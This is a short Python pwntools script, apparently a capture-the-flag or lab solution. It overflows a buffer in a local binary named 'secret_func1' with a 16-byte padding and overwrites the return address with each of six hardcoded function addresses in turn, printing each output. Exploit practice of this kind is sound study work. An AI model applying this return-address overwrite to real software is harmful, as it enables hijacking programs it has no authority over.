from pwn import *

# context.log_level = 'debug'

offset = 16

addrs = {
	"super_secret": 0x565561ad, 
	"secret_function": 0x56556450, 
	"super_hidden": 0x565565aa,
	"super_senza_piombo": 0x56556724,
	"secret":  0x56556877,
	"show_element": 0x565569bc
}

for name in iter(addrs):
	payload = b"A"*offset + p32(addrs[name])
	r = process(["./secret_func1", payload])
	info(name)
	info(r.recvall())
